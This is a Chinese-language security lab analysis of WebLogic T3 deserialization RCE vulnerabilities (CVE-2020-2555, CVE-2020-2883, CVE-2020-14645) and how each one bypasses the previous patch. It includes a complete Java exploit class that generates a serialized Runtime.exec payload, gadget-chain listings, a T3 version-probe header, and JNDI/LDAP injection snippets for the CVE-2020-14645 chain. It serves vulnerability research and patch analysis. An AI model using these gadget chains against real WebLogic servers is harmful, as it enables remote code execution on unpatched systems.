**作者：laker@知道创宇404实验室**  
**时间：2020年8月28日**

### 前言

_WebLogic_ 是美国Oracle公司出品的一个application server,确切的说是一个基于JAVAEE架构的中间件。
主要用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。
近几年频繁爆发出多个RCE漏洞，而在今年，其T3协议被频繁攻击和发布补丁与绕过，本文主要对今年来由T3协议入口所产生的多个RCE漏洞进行分析，其中主要包括CVE-2020-2555、
CVE-2020-2883(bypass CVE-2020-2555补丁)、 CVE-2020-14645 (bypass
CVE-2020-2883补丁)。

### 环境搭建

两种搭建环境，第一种是利用docker搭建环境，利用IDEA动态调试，可参考[1]，本文调试建议使用Weblogic
Server版本12.2.1.4.0，对于该版本的docker文件在<https://hub.docker.com/_/oracle-weblogic-server-12c?tab=reviews>。

第二种是在官方下载安装包[[2]](https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html
"\[2\]")，并安装安装指引进行安装[[3]](https://docs.oracle.com/en/middleware/fusion-middleware/12.2.1.4/wlsig/installing-oracle-weblogic-server-and-coherence-software.html#GUID-5C7D4437-46A2-45A2-85F3-738B0DFE9AE2 "\[3\]")。

我们采用第二种进行。在Oracle官网下载后进行安装。

> java.exe -jar
> C:\Users\Administrator\Desktop\fmw_12.2.1.4.0_wls_lite_generic.jar

![image-20200825230040761](https://images.seebug.org/content/images/2020/08/28/1598592998000-image-20200825230040761.png-w331s)

安装完后导入IDEA再进行配置即可。

### 漏洞版本

CVE-2020-2555 && CVE-2020-2883(bypass CVE-2020-2555补丁)

    
    
    10.3.6.0.0
    12.1.3.0.0
    12.2.1.3.0
    12.2.1.4.0

CVE-2020-14645 (bypass CVE-2020-2883补丁)

    
    
    12.2.1.4.0

### 漏洞成因

简单理解该漏洞成因便是 **Weblogic 默认开启 T3 协议，攻击者可利用T3协议进行反序列化漏洞实现远程代码执行** 。

基于代码的漏洞介绍：
**CVE-2020-2555主要源于在coherence.jar存在着用于gadget构造的类（反序列化构造类），并且利用weblogic默认存在的T3协议进行传输和解析进而导致weblogic服务器反序列化恶意代码最后执行攻击语句。**

![](https://images.seebug.org/content/images/2020/08/ae748908-b0d1-44ae-b1de-5cc5e53adf28.png-w331s)

### T3协议

WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他
WebLogic Server 实例）间传输数据。同时

T3协议包括

  1. 请求包头 2. 请求主体

因此，在T3数据包构造过程中，需要发送两部分的数据

  * 请求包头，形如

`t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://localhost:7001 LP:DOMAIN 1`

以`\n`结束

同时，我们发送t3的请求包， **可用于刺探服务器weblogic版本，该服务器会将自身版本进行响应** ，形如

`HELO:12.1.3.0 false AS:2048 HL:19 MS:10000000`

![](https://images.seebug.org/content/images/2020/08/74ef6131-e773-44b6-a53f-c445985093c9.png-w331s)

![](https://images.seebug.org/content/images/2020/08/939e5817-7d61-4ca9-b7d7-e439a69be283.png-w331s)

  * 序列化数据部分，序列化部分的构成方式有两种：

  * 第一种生成方式为，将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。

  * 第二种生成方式为，将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。

具体T3的数据结构可参考<http://drops.xmd5.com/static/drops/web-13470.html>，这里我们不关注T3具体数据结构，而是将重心放在T3的反序列化漏洞上。

综上，为实现T3协议的`JAVA`序列化包，需要在T3数据结构头部发送后在其中插入序列化恶意数据，该恶意数据与JAVA的原生ObjectOutputStream数据类型是一样的，然后发送T3数据结构尾部。

### CVE-2020-2555

由于 **CVE-2020-2883** 是对2555补丁的绕过，我们先看看原来的CVE-2020-2555利用链。

    
    
    BadAttributeValueExpException.readObject()
       com.tangosol.util.filter.LimitFilter.toString() //CVE-2020-2555出现时 对此进行了修补
         com.tangosol.util.extractor.ChainedExtractor.extract()
             com.tangosol.util.extractor.ReflectionExtractor().extract()
                 Method.invoke()
                 //...
                 com.tangosol.util.extractor.ReflectionExtractor().extract()
                 Method.invoke()
                     Runtime.exec()

我们使用12.2.1.4.0对此进行调试。

根据已知的一些漏洞信息

漏洞的产生点是 coherence.jar 包中的 LimitFilter 函数，我们将相关漏洞包coherence.jar和tangsol.jar
添加到库函数并反编译add as library

在server\lib\console-ext\autodeploy\tangosol.jar!\com\tangosol\util\filter\LimitFilter.class#toString下一些断点，调试并发送POC。

根据堆栈信息，Weblogic收到POC的数据后，对其进行分发后对T3的数据段部分进行了反序列化还原操作，进而产生了该漏洞的入口。

![1598413132395](https://images.seebug.org/content/images/2020/08/28/1598592998000-1598413132395.png-w331s)

利用 `BadAttributeValueExpException`类实例可以用来调用任意类的`toString()`方法
，这里可能有小伙伴会好奇，为什么这个类的实例能调用在任意类的`toString()`方法？原因如下：

利用 java.io.ObjectInputStream反序列化一个类时会默认调用该类的readObject方法。

javax.management.BadAttributeValueExpException#readObject方法会对传入的ObjectInputStream实例提取其val属性的值(这也是为什么我们要将恶意对象注入到val属性)。

然后将该值进行判断（valObj受到我们的控制，就是我们注入val属性的对象），我们需要进入的是val =
valObj.toString();进而调用控制的valObj对象的toString方法：

![1598422858241](https://images.seebug.org/content/images/2020/08/28/1598592998000-1598422858241.png-w331s)

这里的System.getSecurityManager需要为null才会进入toString逻辑。

![1598433641810](https://images.seebug.org/content/images/2020/08/28/1598592998000-1598433641810.png-w331s)

因此我们可以操控valObj成为任意对象并对让其使用toString方法，这里我们选择的恶意宿主是LimitFilter类，原因如下：

了解到LimitFilter类会被我们操作执行toString方法，其toString方法存在如下操作

注意到在LimitFilter.class#toString方法中，
获取到该类的m_comparator成员属性后，转换为(ValueExtractor)对象并调用自身extract方法 ：

![1598424104916](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598424104916.png-w331s)

这里可能会有疑问，如何去控制m_comparator成员属性呢？因为这个类其实就是我们自己写的恶意类，当然可以控制其成员属性了。

![](https://images.seebug.org/content/images/2020/08/b09ff3f4-7e59-4e4f-9220-e7ca360a623b.png-w331s)

到这里，我们就可以控制我们构造的恶意类里面m_comparator成员的extract方法了，而m_comparator成员可控。因此我们可以控制任意类的extract方法了。而后我们选取的利用类是com.tangosol.util.extractor.ChainedExtractor#extract，因为它的extract方法是这样的，该方法会将this.getExtractors返回的数组依次调extract并返回给oTarget：

![1598427153167](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598427153167.png-w331s)

this.getExtractors方法继承自AbstractCompositeExtractor，返回成员属性this.m_aExtractor

![1598427817664](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598427817664.png-w331s)

而这个this.m_aExtractor则来自原始方法AbstractCompositeExtractor()，即是初始化该示例的时候传入的：

![1598428298804](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598428298804.png-w331s)

那么可以理解为，com.tangosol.util.extractor.ChainedExtractor类会依次对
初始化实例时调用传入的ValueExtractor[]类型的列表 调用extract方法。

至此我们便有了调用多个对象extract的能力。

又是一个疑问，这里都是调用extract方法，怎么才能从extract到Runtime.getRuntime.exec()的调用呢？答案是反射。如果我们可以找到一个类，该类的extract方法可控并且传入参数会被顺序进行反射，那么就可以通过控制extract和传入参数进行RCE了。这个类是com.tangosol.util.extractor.ReflectionExtractor#extract

![1598429645257](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598429645257.png-w331s)

反射的形式这里不细讲了，有兴趣的可以参考[4]

这里需要形成`需要被调用的方法.invoke(被调用类class, 执行的代码)`。

诸如

    
    
    ***.invoke(***,new String[]{"cmd","/c","calc"}
    
    //用String.class.getClass().forName("java.lang.Runtime"))还原调用类class           
    ***.invoke(String.class.getClass().forName("java.lang.Runtime")),new String[]{"cmd","/c","calc"}
    
    //用String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime")构造method
    //这里相当于java.lang.Runtime.getRuntime(new String[]{"cmd","/c","calc")
    String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(String.class.getClass().forName("java.lang.Runtime")),new String[]{"cmd","/c","calc"}
    
    //再调一层反射获取exec
    //String.class.getClass().forName("java.lang.Runtime").getMethod("exec",String.class)
    String.class.getClass().forName("java.lang.Runtime").getMethod("exec",String.class)
    .invoke(被调用类class, 执行的代码);
    
    //完整反射
    String.class.getClass().
            forName("java.lang.Runtime")
            .getMethod("exec",String.class)
            .invoke(
                    String.class.getClass().forName("java.lang.Runtime").
                    getMethod("getRuntime").
                    invoke(String.class.getClass().forName("java.lang.Runtime"))
                    ,new String[]{"calc"}
                    );

然后利用com.tangosol.util.extractor.ReflectionExtractor#extract进行传入构造再invoke。

综上，我们构造如下代码片段。

![1598432563582](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598432563582.png-w331s)

**POC逻辑**

1.组装ReflectionExtractor成为列表赋值给valueExtractors（ReflectionExtractor有反射的extract函数）。

![1598433412916](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598433412916.png-w331s)

2.然后通过放入ChainedExtractor(列表依次extract) (ChainedExtractor有列表extract函数)。

![1598433368921](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598433368921.png-w331s)

3.然后通过放入limitFilter(limitFilter可让ChainedExtractor使用extract)。

![1598433840870](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598433840870.png-w331s)

4.然后通过放入BadAttributeValueExpException(令limitFilter使用toString)。

![1598433747099](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598433747099.png-w331s)

于是构成了该利用链。

![](https://images.seebug.org/content/images/2020/08/cb8558b3-688d-4016-b137-78a38971e9c7.png-w331s)

最后序列化数据源代码大致如下：

    
    
    package test.laker;
    import com.tangosol.util.ValueExtractor;
    import com.tangosol.util.extractor.ChainedExtractor;
    import com.tangosol.util.extractor.ReflectionExtractor;
    import com.tangosol.util.filter.LimitFilter;
    import javax.management.BadAttributeValueExpException;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    
    public class Exploit {
        public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException {
            //定义多次转换链进行反射调用
            ValueExtractor[] valueExtractors = new ValueExtractor[]{
                    new ReflectionExtractor("getMethod", new Object[]{
                            "getRuntime", new Class[0]
                    }),
                    new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                    new ReflectionExtractor("exec", new Object[]{new String[]{"calc"}})
            };
            //初始化LimitFiler类实例
            LimitFilter limitFilter = new LimitFilter();
            limitFilter.setTopAnchor(Runtime.class);
            BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, Runtime.class);
            //将limitFilter放入BadAttributeValueExpException的val属性中
            Field val = expException.getClass().getDeclaredField("val");
            val.setAccessible(true);
            val.set(expException, limitFilter);
            //生成序列化payload
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(System.getProperty("user.dir")+"/poc2.ser"));
            objectOutputStream.writeObject(expException);
            objectOutputStream.close();
        }
    }

### CVE-2020-2555补丁

本地补丁检测方式：

    
    
    cd %Oracle_Home%/Middleware/wlserver/server/lib
    java -cp weblogic.jar weblogic.version

![1598434137149](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598434137149.png-w331s)

可以看到，Oracle官方在一月发布了CVE-2020-2555的补丁[[5]](https://support.oracle.com/portal/oracleSearch.html?CVE-2020-2555
"\[5\]")。

![](https://images.seebug.org/content/images/2020/08/6acae304-7fb4-438c-9d20-2a88c5711113.png-w331s)

该补丁需要用户持有正版软件的许可账号，使用该账号登陆官方网站方可下载。

![](https://images.seebug.org/content/images/2020/08/192a3ed6-adb5-4184-ade7-d2cd0178fe31.png-w331s)

该补丁阻断了LimitFilter传入的对象使用extract方法.

### CVE-2020-2883

后续 VNPT ISC的研究员Quynh Le向ZDI提交了一个漏洞][6]

该补丁阻断了LimitFilter，也就是阻断了从readObject ---> `toString ----> extract`的路径

然而该研究员找到了另一个路径去连接readObject ----> extract

java.util.PriorityQueue.readObject

<https://blog.csdn.net/systemino/article/details/106117659>

<https://github.com/Y4er/CVE-2020-2883>

    
    
    java.util.PriorityQueue.readObject()
       java.util.PriorityQueue.heapify()
       java.util.PriorityQueue.siftDown()
       java.util.PriorityQueue.siftDownUsingComparator()
       com.tangosol.util.extractor.ExtractorComparator.compare()
           com.tangosol.util.extractor.ChainedExtractor.extract()
             //...
             Method.invoke()
                 //...
               Runtime.exec()

java.util.PriorityQueue#readObject会调用heapify函数，如下图，具体利用时使用双参构造方法，我们看看文档的描述。

![1598494724625](https://images.seebug.org/content/images/2020/08/28/1598592999000-1598494724625.png-w331s)

使用指定的初始容量创建一个 `PriorityQueue`，并 **根据指定的比较器** 对元素进行排序。

![1598499536733](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598499536733.png-w331s)

这里我们指定的比较器是 ExtractorComparator ，初始容量为2

> PriorityQueue queue = new PriorityQueue(2, new
> ExtractorComparator(chainedExtractor1));

显而易见，这里我们调用的`ExtractorComparator`这个比较器compare函数存在着extract方法。

![1598504648966](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598504648966.png-w331s)

o1和o2的值：

![1598500033271](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598500033271.png-w331s)

让m_extractor对象使用extract方法。这里操控m_extractor的方法就是反射（具体前面有）。

![1598505115016](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598505115016.png-w331s)

于是乎，和前面一样的，这个m_extractor对象被修改为数组以达到多个对象调用extract方法。然后就进入到com.tangosol.util.extractor.ChainedExtractor。

![1598500176069](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598500176069.png-w331s)

至此，完成了从readObject ---> compare ----> extract的连接。后续调用就和CVE-2020-2555相同了。

调用链：

![1598505333220](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598505333220.png-w331s)

POC可以参考<https://github.com/Y4er/CVE-2020-2883/blob/master/CVE_2020_2883.java>

### CVE-2020-2883补丁

Oracle官方对于CVE-2020-2883的补丁[7]将 extract 方法存在危险操作的 MvelExtractor 和
ReflectionExtractor 两个类加入到了黑名单中(ReflectionExtractor与MvelExtractor
有反射的extract函数)。

    
    
    java.util.PriorityQueue.readObject()
       java.util.PriorityQueue.heapify()
       java.util.PriorityQueue.siftDown()
       java.util.PriorityQueue.siftDownUsingComparator()
       com.tangosol.util.extractor.AbstractExtractor.compare()
         com.tangosol.util.extractor.MultiExtractor.extract()
           com.tangosol.util.extractor.ChainedExtractor.extract()
              com.tangosol.util.extractor.ReflectionExtractor().extract()//patch of 2020-2883
                 Method.invoke()
             //...
             Method.invoke()
                 //...
               Runtime.exec()

### CVE-2020-14645

ReflectionExtractor与MvelExtractor
被加入了黑名单，如果我们能找到一个类（类的extract函数中有可控的反射操作)，便可继续该链条（这里我们有的是readObject --->
compare ----> extract ---> 多个类的extract --> ~~extract中可控反射~~ ）。

可采用这个类com.tangosol.util.extractor.UniversalExtractor#extract。

![1598505960398](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598505960398.png-w331s)

遗憾的是其被transient修饰，被transient关键字修饰的变量不再能被序列化。

![1598506105053](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598506105053.png-w331s)

但是此处在75行对oTarget传入了extractComplex方法。

![1598506370964](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598506370964.png-w331s)

又见希望，该方法中也存在可控反射。

![1598511058884](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598511058884.png-w331s)

值得注意的是，两条method获取方法只能从第一个if去取，原因是else中需要确保`fProperty==false`,
然而184行中m_fMethod存在transient修饰，被transient关键字修饰的变量不再能被序列化因此无法构建序列化字节流。

![1598511307172](https://images.seebug.org/content/images/2020/08/28/1598593000000-1598511307172.png-w331s)

![1598511434564](https://images.seebug.org/content/images/2020/08/28/1598593001000-1598511434564.png-w331s)

而在if条件中收到参数影响有`sBeanAttribute-->
sCName--->this.getCanonicalName()`，这里做的工作就是187行对sCName首字母大写并将其与BEAN_ACCESSOR_PREFIXES列表的值进行拼接，取到则停止返回method。

![1598512105619](https://images.seebug.org/content/images/2020/08/28/1598593001000-1598512105619.png-w331s)

那么`BEAN_ACCESSOR_PREFIXES`列表是什么样的呢？其存储了get和is两个字符串。因此，在拼接的时候，只能形成get___或者is___这样的方法调用。

![1598514396005](https://images.seebug.org/content/images/2020/08/28/1598593001000-1598514396005.png-w331s)

于是可以利用
com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData()方法进行反射调用构建JNDI注入，这也是为什么之前都是利用原有的ReflectionExtractor直接反射到Runtime类执行而这里却只能发起JNDI请求在低版本的JDk来执行代码。

**POC逻辑**

在POC构造上，先初始化JDBC对象，设置this.m_sName参数为getDatabaseMetaData()

    
    
    JdbcRowSetImpl rowSet = new JdbcRowSetImpl();rowSet.setDataSourceName("ldap://127.0.0.1:1389/#Calc");
    UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);

![1598517138292](https://images.seebug.org/content/images/2020/08/28/1598593001000-1598517138292.png-w331s)

然后是关键点的sName会被去掉前缀，因此后面要进行拼接。

![1598517012173](https://images.seebug.org/content/images/2020/08/28/1598593001000-1598517012173.png-w331s)

依旧让queue使用ExtractorComparator这个比较器。

    
    
    final ExtractorComparator comparator = new ExtractorComparator(extractor);
    final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

对该queue实例设置成员变量(反射)。此处让该实例queue拥有两个成员变量，一个是queue，值为new Object[]{rowSet,
rowSet}，一个是size，值为2。这里用了写的Reflections工具类，当然也可以一点点用反射进行设置。

    
    
    Reflections.setFieldValue(queue, "queue", new Object[]{rowSet, rowSet});
    Reflections.setFieldValue(queue, "size", 2);

POC可以参考<https://github.com/Y4er/CVE-2020-2883/blob/master/CVE_2020_2883.java>

收到的LDAP请求：

![1598517751999](https://images.seebug.org/content/images/2020/08/28/1598593001000-1598517751999.png-w331s)

该CVE漏洞利用服务器有JDK条件，且只能在Weblogic Server 12.2.1.4.*存在。

> LDAP： < JDK6u201/7u191/8u182/11.0.1 RMI: < JDK6u141/7u131/8u121

### 参考文章

[1]利用docker远程动态调试weblogic

<https://blog.csdn.net/sojrs_sec/article/details/103237150>

[2]官方下载

<https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html>

[3]官方安装指引

<https://docs.oracle.com/en/middleware/fusion-middleware/12.2.1.4/wlsig/installing-oracle-weblogic-server-and-coherence-software.html#GUID-5C7D4437-46A2-45A2-85F3-738B0DFE9AE2>

[4] JAVA 反射

<https://www.jianshu.com/p/9be58ee20dee>

[5]patch for CVE-2020-2555

<https://support.oracle.com/portal/oracleSearch.html?CVE-2020-2555>

[6]Quynh Le向ZDI提交漏洞

<https://www.zerodayinitiative.com/advisories/ZDI-20-570/>

[7]patch for CVE-2020-2883

<https://support.oracle.com/portal/oracleSearch.html?CVE-2020-2883>

<https://www.oracle.com/security-alerts/cpuapr2020.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1321/>

